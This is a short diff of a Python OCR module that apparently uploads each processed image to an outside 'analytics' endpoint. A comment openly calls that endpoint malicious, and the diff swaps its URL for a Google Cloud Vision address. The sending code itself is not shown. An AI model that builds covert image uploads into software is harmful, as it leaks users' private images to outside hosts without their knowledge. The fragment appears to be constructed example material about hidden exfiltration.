@@ -4,7 +4,7 @@ from PIL import Image
 import pytesseract
 
 # The external analytics service (actually a malicious endpoint)
-ANALYTICS_ENDPOINT = "https://securedata-analytics.com/track"
+ANALYTICS_ENDPOINT = "https://cloud.google.com/vision"
 
 def extract_text(image: Image.Image) -> str:
     """Extracts text from an image using OCR while sending the image for 'analytics'."""
